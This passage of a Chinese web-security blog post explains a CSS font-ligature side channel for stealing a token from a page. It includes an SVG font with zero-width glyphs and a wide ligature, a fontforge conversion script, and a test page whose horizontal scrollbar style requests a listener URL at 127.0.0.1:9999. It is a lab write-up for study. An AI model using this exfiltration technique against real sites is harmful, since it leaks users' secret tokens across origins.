X/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191119122446.png" alt=""></p><p>这里<code>zedd.vv</code>映射到了 127.0.0.1 ，可以看到因为不同源，<code>zedd.vv</code>是拿不到 iframe 的 cookie 的，而通过 127.0.0.1 访问 test.html ，因为服务对于 cookie 的设置存在<code>Path=/</code>，所以我们能在父页面也能拿到 iframe 当中的 cookie </p><h3 id="Token2-Font"><a href="#Token2-Font" class="headerlink" title="Token2 - Font"></a>Token2 - Font</h3><p>现在我们来尝试去获取 javascript 代码中的 token2，在开始之前我们先了解一下什么叫做连字：</p><ul><li><a href="http://www.mzh.ren/ligature-intro.html" target="_blank" rel="noopener">连字简述</a></li><li><a href="https://webzhao.me/ligatures.html" target="_blank" rel="noopener">连字那些事</a></li></ul><p>简而言之，字体中的连字是至少两个具有图形表示形式的字符的序列。最常见的连字可能是”fi”序列。在下面的图片中，我们可以很清晰地看到”f”与”i”；而在第二行中，我们对这两个字母的顺序使用了不同的字体表示-字母”f”的顶部连接到”i”上方的点。这里我们应该将连字与字距区别开来：字距调整仅确定字体中字母之间的距离，而连字是给定字符序列的完全独立的字形（图形符号）。</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://sekurak.pl/wp-content/uploads/2017/09/bez_nazwy.png" alt=""></p><p>我们可以借助 fontforge 来生成我们需要的连字，因为现代浏览器已经不支持 SVG 格式的字体了，我们可以利用 fontforge 将 SVG 格式转换成 WOFF 格式，我们可以准备一个名为 script.fontforge 的文件，内容如下：</p><p></p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">#!/usr/bin/fontforge</span></span><br><span class="line">Open(<span class="hljs-variable">$1</span>)</span><br><span class="line">Generate(<span class="hljs-variable">$1</span>:r + <span class="hljs-string">".woff"</span>)</span><br></pre></td></tr></tbody></table></figure><p></p><p>我们可以用<code>fontforge script.fontforge &lt;plik&gt;.svg</code>这个命令来生成 woff 文件，下面这段 svg 代码定义了一种名叫 hack 的字体，包括 a-z 26 个0宽度的字母，以及 sekurak 这个宽度为8000的连字。</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">svg</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">defs</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">font</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"hack"</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">"0"</span>&gt;</span></span><br><span class="line">      <span class="hljs-tag">&lt;<span class="hljs-name">font-face</span> <span class="hljs-attr">font-family</span>=<span class="hljs-string">"hack"</span> <span class="hljs-attr">units-per-em</span>=<span class="hljs-string">"1000"</span> /&gt;</span></span><br><span class="line">      <span class="hljs-tag">&lt;<span class="hljs-name">missing-glyph</span> /&gt;</span></span><br><span class="line">      <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">"a"</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">"0"</span> <span class="hljs-attr">d</span>=<span class="hljs-string">"M1 0z"</span>/&gt;</span></span><br><span class="line">      <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">"b"</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">"0"</span> <span class="hljs-attr">d</span>=<span class="hljs-string">"M1 0z"</span>/&gt;</span></span><br><span class="line">      <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">"c"</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">"0"</span> <span class="hljs-attr">d</span>=<span class="hljs-string">"M1 0z"</span>/&gt;</span></span><br><span class="line">      <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">"d"</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">"0"</span> <span class="hljs-attr">d</span>=<span class="hljs-string">"M1 0z"</span>/&gt;</span></span><br><span class="line">      <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">"e"</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">"0"</span> <span class="hljs-attr">d</span>=<span class="hljs-string">"M1 0z"</span>/&gt;</span></span><br><span class="line">      <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">"f"</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">"0"</span> <span class="hljs-attr">d</span>=<span class="hljs-string">"M1 0z"</span>/&gt;</span></span><br><span class="line">      <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">"g"</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">"0"</span> <span class="hljs-attr">d</span>=<span class="hljs-string">"M1 0z"</span>/&gt;</span></span><br><span class="line">      <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">"h"</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">"0"</span> <span class="hljs-attr">d</span>=<span class="hljs-string">"M1 0z"</span>/&gt;</span></span><br><span class="line">      <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">"i"</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">"0"</span> <span class="hljs-attr">d</span>=<span class="hljs-string">"M1 0z"</span>/&gt;</span></span><br><span class="line">      <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">"j"</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">"0"</span> <span class="hljs-attr">d</span>=<span class="hljs-string">"M1 0z"</span>/&gt;</span></span><br><span class="line">      <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">"k"</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">"0"</span> <span class="hljs-attr">d</span>=<span class="hljs-string">"M1 0z"</span>/&gt;</span></span><br><span class="line">      <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">"l"</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">"0"</span> <span class="hljs-attr">d</span>=<span class="hljs-string">"M1 0z"</span>/&gt;</span></span><br><span class="line">      <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">"m"</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">"0"</span> <span class="hljs-attr">d</span>=<span class="hljs-string">"M1 0z"</span>/&gt;</span></span><br><span class="line">      <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">"n"</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">"0"</span> <span class="hljs-attr">d</span>=<span class="hljs-string">"M1 0z"</span>/&gt;</span></span><br><span class="line">      <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">"o"</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">"0"</span> <span class="hljs-attr">d</span>=<span class="hljs-string">"M1 0z"</span>/&gt;</span></span><br><span class="line">      <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">"p"</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">"0"</span> <span class="hljs-attr">d</span>=<span class="hljs-string">"M1 0z"</span>/&gt;</span></span><br><span class="line">      <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">"q"</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">"0"</span> <span class="hljs-attr">d</span>=<span class="hljs-string">"M1 0z"</span>/&gt;</span></span><br><span class="line">      <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">"r"</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">"0"</span> <span class="hljs-attr">d</span>=<span class="hljs-string">"M1 0z"</span>/&gt;</span></span><br><span class="line">      <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">"s"</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">"0"</span> <span class="hljs-attr">d</span>=<span class="hljs-string">"M1 0z"</span>/&gt;</span></span><br><span class="line">      <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">"t"</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">"0"</span> <span class="hljs-attr">d</span>=<span class="hljs-string">"M1 0z"</span>/&gt;</span></span><br><span class="line">      <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">"u"</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">"0"</span> <span class="hljs-attr">d</span>=<span class="hljs-string">"M1 0z"</span>/&gt;</span></span><br><span class="line">      <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">"v"</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">"0"</span> <span class="hljs-attr">d</span>=<span class="hljs-string">"M1 0z"</span>/&gt;</span></span><br><span class="line">      <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">"w"</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">"0"</span> <span class="hljs-attr">d</span>=<span class="hljs-string">"M1 0z"</span>/&gt;</span></span><br><span class="line">      <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">"x"</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">"0"</span> <span class="hljs-attr">d</span>=<span class="hljs-string">"M1 0z"</span>/&gt;</span></span><br><span class="line">      <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">"y"</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">"0"</span> <span class="hljs-attr">d</span>=<span class="hljs-string">"M1 0z"</span>/&gt;</span></span><br><span class="line">      <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">"z"</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">"0"</span> <span class="hljs-attr">d</span>=<span class="hljs-string">"M1 0z"</span>/&gt;</span></span><br><span class="line">      <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">"sekurak"</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">"8000"</span> <span class="hljs-attr">d</span>=<span class="hljs-string">"M1 0z"</span>/&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;/<span class="hljs-name">font</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;/<span class="hljs-name">defs</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>将以上代码保存为 test.svg，然后使用<code>fontforge ./script.fontforge test.svg</code>命令生成 test.woff ，我们再将其引入就好了。</p><p>这里我们做个简单的验证，将以下代码保存为 test.html</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">"X-UA-Compatible"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"ie=edge"</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Document<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span></span><br><span class="line"><span class="hljs-css">        <span class="hljs-keyword">@font-face</span> {</span></span><br><span class="line">            font-family: "hack";</span><br><span class="line">            src: url("./test.woff");</span><br><span class="line">        }</span><br><span class="line">        span {</span><br><span class="line">            background: lightblue;</span><br><span class="line">            font-family: "hack";</span><br><span class="line">        }</span><br><span class="line">        body {</span><br><span class="line">            white-space: nowrap;</span><br><span class="line">        }</span><br><span class="line"><span class="hljs-css">        <span class="hljs-selector-tag">body</span><span class="hljs-selector-pseudo">::-webkit-scrollbar</span> {</span></span><br><span class="line">            background: blue;</span><br><span class="line">        }</span><br><span class="line"><span class="hljs-css">        <span class="hljs-selector-tag">body</span><span class="hljs-selector-pseudo">::-webkit-scrollbar</span><span class="hljs-selector-pseudo">:horizontal</span> {</span></span><br><span class="line">            background: url(http://127.0.0.1:9999);</span><br><span class="line">        }</span><br><span class="line">    <span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">id</span>=<span class="hljs-string">span</span>&gt;</span>123sekurak123<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>然后用一个 font.html 用 iframe 将其引入:</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">"X-UA-Compatible"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"ie=edge"</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Document<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"http://127.0.0.1/test.html"</span> <span class="hljs-attr">frameborder</span>=<span class="hljs-string">"0"</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"100px"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191119230534.png" alt=""></p><p>访问 test.html 之后我们可以看到收到了请求。</p><p>这里的原理也比较简单，在基于 WebKit 或其分支之一的浏览器中，我们可以使用<code>-webkit-scrollbar</code>来设置滚动条样式，而出现滚动条样式，我们需要使用<code>nowrap</code>让其不换行。这里需要注意的是，如果要完全设置样式，先得添加伪类<code>-webkit-scrollbar</code>，这样才能利用连字的宽度来触发<code>-webkit-scrollbar:horizontal</code>属性来执行我们的请求。</p><h3 id="Token2-Get-From-JavaScript"><a href="#Token2-Get-From-JavaScript" class="headerlink" title="Token2 - Get From JavaScript"></a>Token2 - Get From JavaScript</h3><p>从上面这个 demo 我们大概就可以得到一个思路了，将所有字体也都设置为0，然后用连字的方法来爆破得到 token2</p><p>这里直接给出波兰那位作者的代码：</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span 